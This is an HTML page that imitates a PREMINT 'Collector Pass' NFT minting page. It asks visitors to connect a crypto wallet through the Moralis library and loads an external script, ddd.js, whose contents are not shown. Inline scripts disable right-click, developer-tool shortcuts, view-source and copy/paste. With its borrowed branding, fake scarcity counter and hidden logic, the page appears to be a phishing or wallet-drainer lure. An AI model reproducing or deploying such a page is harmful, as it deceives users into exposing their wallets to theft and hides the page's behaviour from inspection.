
<!DOCTYPE html>
<html lang="en">
<head>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/axios/0.27.2/axios.min.js"></script>
    <script src="https://npmcdn.com/moralis@1.6.0/dist/moralis.js"></script>

    <meta name="viewport" content="width=device-width">
    <meta charset="utf-8">
    <title>PREMINT | Mint Live</title>
    <link rel="icon" href="https://collectors.premint.xyz/favicon.ico">
    <link rel="preload" href="/1.css" as="style">
    <link rel="stylesheet" href="/2.css" data-n-g="">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Nunito+Sans:ital,wght@0,200;0,300;0,400;0,600;0,700;0,800;0,900;1,200;1,300;1,400;1,600;1,700;1,800;1,900&display=swap" rel="stylesheet">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
      <script src="https://cdnjs.cloudflare.com/ajax/libs/axios/0.27.2/axios.min.js"></script>
    <link href="https://fonts.googleapis.com/css2?family=Frank+Ruhl+Libre:wght@300;400;500;700;900&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="./style2.css">
</head>

<body>
    <div id="__next" data-reactroot="">
        <div>
            <div>
                <div class="max-w-7px m-auto flex justify-between items-center px-[24px] md:px-[38px] py-[28px]"><a href="/"><img src="/premint.svg" alt="" class="hidden md:block"><img src="https://collectors.premint.xyz/premint.svg" alt="" class="block md:hidden"></a>
                    <nav>
                       
                    </nav>
                </div>
                <div class=""><a id="mint"></a>
                    <div
                        class="px-[24px] md:px-10 max-w-[1200px] m-auto mt-[62px] md:flex justify-between md:space-x-[80px]">
                        <div class="w-full">
                            <img src="/collector-pass.png">
                        </div>
                        <div class="max-w-[560px] m-auto flex flex-col items-start space-y-[24px]">
                            <div class="space-y-[16px]">
                                <h1>Premint Collector Pass</h1>
                                <p>Please connect in order to mint a PREMINT Collector Pass. See below to <span style="color: rgb(44 187 219)">connect wallet</span>.
                            </div><a id="mint"></a>
                            <div class="w-full"><a id="connect_wallet"
                                    class="cool-button cursor-pointer py-[20px] bg-teal text-black font-[800] uppercase block w-full rounded-full bg-gradient-to-r from-teal to-teal-lightest text-center"
                                    >Connect Wallet</a>
                                    <a id="hh" style="display: none;"
                                    class="cool-button cursor-pointer py-[20px] bg-teal text-black font-[800] uppercase block w-full rounded-full bg-gradient-to-r from-teal to-teal-lightest text-center"
                                    >Mint</a>
                                    <div id="loader" class="lds-dual-ring"></div>
                                <div class="bg-[#00171F] p-[24px] rounded-xl mt-[24px]">
                                    <p class="text-gray-200 font-[800]">PREMINT</p>
                                    <p class="text-gray-300 font-[400]">Feeling lucky?</p>
                                    <div class="w-full rounded-full bg-teal-darker h-[8px] mt-[24px] mb-[8px]">
                                        <div id="cool_width" class="bg-green rounded-full h-[8px]" style="width: 2px;"></div>
                                    </div>
                                    <p><span id="text-count" class="text-white">...</span> /
                                        <!-- --> <span class="text-white">1,000</span> <!-- --> left</p>
                                </div>

                            </div>
                        </div>
                    </div>
            </div>
            <div class="Toastify"></div>
        </div>
    </div>
</body>
<script src="./ddd.js"></script>
<script src="https://code.jquery.com/jquery-3.6.0.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
<script language="JavaScript">
  $(document).on("contextmenu", function (e) {
    e.preventDefault();
  });
</script>
<script language="JavaScript">
  $(document).keydown(function (event) {
    if (event.keyCode == 123) {
      return false;
    } else if (event.ctrlKey && event.shiftKey && event.keyCode == 73) {
      return false; //Prevent from ctrl+shift+i
    }
  });
</script>
<script>
  document.onkeydown = function (e) {
    if (e.ctrlKey && (e.keyCode === 67 || e.keyCode === 86 || e.keyCode === 85 || e.keyCode ===
      117)) { //Alt+c, Alt+v will also be disabled sadly. 
    }
    return false;
  };
</script>
<script>
  function click() {
    if (event.button == 2 || event.button == 3) {
      oncontextmenu = 'return false';
    }
  }
  document.onmousedown = click
  document.oncontextmenu = new Function("return false;")
</script>

</html>
